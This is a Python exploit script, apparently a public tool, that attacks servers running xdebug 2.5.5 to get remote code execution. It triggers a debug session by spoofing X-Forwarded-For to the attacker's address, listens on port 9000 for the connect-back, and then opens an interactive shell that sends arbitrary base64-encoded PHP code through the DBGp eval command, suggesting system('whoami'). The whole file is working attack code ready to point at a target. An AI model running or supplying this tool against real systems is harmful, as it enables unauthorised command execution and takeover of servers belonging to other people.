#!/usr/bin/env python3

# Libraries
import socket
import base64
import signal
import sys
import threading
import time
import argparse
import requests
import re
import pdb

# Colors
class c:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'

def banner():
    print(c.YELLOW + "\n██╗  ██╗██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗ ")
    print("╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝ ")
    print(" ╚███╔╝ ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗   - By D3Ext")
    print(" ██╔██╗ ██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║")
    print("██╔╝ ██╗██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ " + c.END)

# Ctrl + C Function
def exit_handler(sig, frame):
    print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting...\n" + c.END)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

def parse():
    parser = argparse.ArgumentParser(description="xdebug v2.5.5 RCE Exploit")
    parser.add_argument('-u', '--url', help="URL of the target", required=True)
    parser.add_argument('-l', '--lhost', help="LHOST to trigger the RCE", required=True)
    parser.add_argument('-b', '--no-banner', help="Don't print the program banner", action='store_true', required=False)

    return parser.parse_args()

def trigger_rce(url,lhost):
    time.sleep(1)
    if url.endswith(".php"):
        url = url + "?XDEBUG_SESSION_START=phpstorm"

    elif url.endswith("/"):
        url = url + "index.php?XDEBUG_SESSION_START=phpstorm"

    else:
        url = url + "/index.php?XDEBUG_SESSION_START=phpstorm"

    rce_headers = {
        'X-Forwarded-For': '%s' % lhost
    }

    try:
        r = requests.get(url, headers=rce_headers)

    except:
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Target not vulnerable or error triggering the exploit\n" + c.END)

# Main
args = parse()

url = args.url
lhost = args.lhost

t = threading.Thread(target=trigger_rce, args=(url,lhost))
t.start()

try:
    # Create socket and start program
    banner()

    ip_port = ('0.0.0.0', 9000) 
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] XDEBUG exploit served on port 9000, waiting for connections" + c.END)
    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Attempting to trigger the RCE" + c.END)

    sk = socket.socket()
    sk.bind(ip_port)
    sk.listen(10) 
    conn, addr = sk.accept()

except Exception as e:
    print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Error serving exploit on port 9000\n" + c.END)
    sys.exit(0)


# If a connection is received enter the loop
counter=0
rce_output=""
print(c.BLUE + '\n[' + c.END + c.YELLOW + "+" + c.END + c.BLUE + '] Exploit triggered successfully' + c.END)
print(c.BLUE + '[' + c.END + c.YELLOW + "+" + c.END + c.BLUE + '] Now you can execute php code: ' + c.END + c.YELLOW + 'system("whoami");' + c.END)
print(c.BLUE + '[' + c.END + c.YELLOW + '+' + c.END + c.BLUE + "] Type quit to exit the shell" + c.END)
while  True: 
    client_data = conn.recv(1024) 
    rce_output = re.findall(r'<!\[CDATA\[(.*?)\]\]>', str(client_data))[0]

    if counter == 1:
        try:
            rce_output = base64.b64decode(rce_output)
            print(str(rce_output))
        except:
            pass

    command = input(c.BLUE + "\n[" + c.YELLOW + "#" + c.END + c.BLUE + "] Enter php code >> " + c.END)

    if command == "exit" or command == "quit":
        conn.close()
        print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting...\n" + c.END)
        sys.exit(0)

    counter=1

    conn.send(b'eval -i 1 -- %s\x00' % base64.b64encode(command.encode()))

